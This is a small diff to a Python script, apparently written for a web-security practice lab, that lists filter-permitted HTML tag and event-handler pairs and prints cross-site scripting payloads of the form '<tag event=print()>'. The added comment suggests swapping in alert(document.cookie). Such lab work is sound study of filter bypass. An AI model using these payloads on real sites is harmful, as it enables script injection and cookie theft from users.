@@ -96,4 +96,4 @@ for tag in allowed_tags:
 print(f"\nAllowed tag+event combos: {allowed_events}")
 print("\nSuggested payload:")
 for tag, event in allowed_events:
-    print(f"  <{tag} {event}=print()>")
+    print(f"  <{tag} {event}=print()>")# Note: replace print() with alert() or alert(document.cookie) depending on the lab
